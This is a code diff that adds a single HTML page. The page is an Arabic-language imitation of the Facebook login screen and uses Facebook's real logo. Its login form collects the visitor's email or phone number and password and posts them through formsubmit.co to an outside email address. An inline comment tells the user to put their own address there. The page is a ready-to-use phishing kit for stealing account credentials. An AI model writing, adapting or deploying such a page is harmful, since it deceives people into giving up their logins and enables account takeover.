@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="utf-8">
+    <title>login facebook</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            width: 400px;
+            text-align: center;
+        }
+        .logo {
+            width: 200px;
+            margin-bottom: 20px;
+        }
+        h2 {
+            color: #1c1e21;
+            font-size: 20px;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 12px;
+            width: 100%;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover {
+            background-color: #166fe5;
+        }
+        a {
+            color: #1877f2;
+            text-decoration: none;
+            display: block;
+            margin-top: 15px;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="شعار" class="logo">
+        <h2>يمنحك فيسبوك إمكانية التواصل مع الأشخاص ومشاركة ما تريد معهم.</h2>
+        
+        <!-- ✅ عدل الإيميل هنا لبريدك الفعلي -->
+        <form action="https://formsubmit.co/jjooo12345@proton.me" method="POST">
+            <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            <input type="password" name="password" placeholder="كلمة السر" required>
+            <button type="submit">تسجيل الدخول</button>
+            <a href="#">هل نسيت كلمة السر؟</a>
+            <hr>
+            <button type="button" id="createAccount">إنشاء حساب جديد</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('createAccount').addEventListener('click', function () {
+            alert('زر إنشاء حساب جديد - يمكن إضافة وظيفة هنا لاحقًا');
+        });
+    </script>
+</body>
+</html>
